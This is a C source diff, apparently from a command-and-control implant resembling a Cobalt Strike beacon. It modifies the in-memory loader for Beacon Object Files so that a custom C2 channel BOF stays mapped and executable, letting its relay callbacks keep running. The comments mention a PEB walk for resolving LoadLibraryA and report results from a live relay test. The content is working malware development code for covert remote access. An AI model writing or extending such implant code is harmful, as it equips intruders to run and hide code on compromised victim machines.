@@ -502,6 +502,30 @@ static char * bof_cached;
 static SIZE_T bof_cached_size;
 static int    bof_cached_how;
 
+/* A BOF that installs callbacks OUTLIVING its run (4.12 UDC2: the channel
+ * BOF leaves proxy/close pointers inside its mapped code) must keep its
+ * block executable and must never have it recycled by the reuse cache or
+ * freed at load-tail - the idle-RW flip made every later proxy() call
+ * DEP-fault into a silent abort (live: relay saw the connect from go()
+ * but zero frames afterwards). Pinning detaches the block from the cache
+ * and leaves the split permissions (code RX / data RW) in force. */
+static char * bof_pinned = NULL;
+static SIZE_T bof_pinned_size;
+static int    bof_pinned_how;
+static BOOL   bof_load_pin = FALSE;
+
+void bof_set_pin(BOOL on) {
+	bof_load_pin = on;
+}
+
+void bof_unpin(void) {
+	if (bof_pinned == NULL)
+		return;
+	bof_free(bof_pinned, bof_pinned_how);
+	bof_pinned = NULL;
+	bof_pinned_size = 0;
+}
+
 /* tier-2 item6: DYNAMICF import resolution must survive the boot context
  * (udc2_init loads the UDC2 BOF before http_init). Resolve the real
  * kernel32!LoadLibraryA through a PEB walk when the plain call path is
@@ -757,6 +781,19 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 	}
 
 	if (success) {
+		/* claim the pin BEFORE anything else: from here the block must
+		 * survive the load tail (no idle-RW flip, no free, no recycle) */
+		if (bof_load_pin) {
+			if (bof_pinned != NULL)
+				bof_unpin(); /* failed retry: previous go() never installed callbacks */
+			bof_pinned = base;
+			bof_pinned_size = total;
+			bof_pinned_how = how;
+			if (bof_cached == base) {
+				bof_cached = NULL;
+				bof_cached_size = 0;
+			}
+		}
 		/* Relocs patch the extract buffers (execsrc). Copy them onto the
 		 * executable mapping before wiping the extracts. */
 		if (code.buffer) memcpy(code_dst, code.buffer, code.length);
@@ -862,7 +899,11 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 		}
 	}
 
-	if (!setting_short(SETTING_BOF_REUSE_MEMORY)) {
+	if (base == bof_pinned) {
+		/* pinned BOF (UDC2): keep the split permissions alive - its
+		 * callbacks run on every later cycle from this very block */
+	}
+	else if (!setting_short(SETTING_BOF_REUSE_MEMORY)) {
 		bof_free(base, how);
 		if (bof_cached == base) {
 			bof_cached = NULL;
